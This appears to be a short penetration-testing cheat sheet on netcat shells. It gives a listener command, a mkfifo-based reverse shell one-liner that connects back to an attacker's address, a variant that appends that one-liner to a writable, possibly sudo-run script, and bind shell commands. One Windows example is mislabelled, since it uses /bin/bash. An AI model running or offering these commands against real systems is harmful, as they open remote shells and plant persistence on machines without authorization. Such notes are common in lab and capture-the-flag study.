# NETCAT: Shells 
## Unstable
#### Reverse Shell
Set up a listener on your machine ready to catch an incoming shell. 
```text
nc -lvnp [port_number]
```
- -l is the listener
- -v is to verbose the output
- -n to not resolve host names
- -p specifies the port
  
If you have RCE on a machine then you can issue this command to connect to your machine (linux):
```text
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip_address] [port] >/tmp/f
```
If you have read/write permissions on a script, especially if it can be run as sudo! Use this command to create a reverse shell:
```text
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip_address] [port] >/tmp/f' | tee -a [script_name].sh
```

#### Bind Shells
Connect to a shell listening on a target machine.
```text
nc [target_ip_address] [port_number]
```
If the target machine is Windows, run the following command:
```text
nc [your_ip_address] [port_number] -e /bin/bash
```
If the target machine is Linux, run the following command:
```text
mkfifo /tmp/f; nc -lvnp [port_number] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
Note: the -e option executes a process on connection.
## Netcat Payloads
When using the -e options it only works on specific versions of netcat such as:
- nc.exe (located at: /usr/share/windows-resources/binaries/nc.exe on Kali)
- netcat-traditional (installed on Kali)
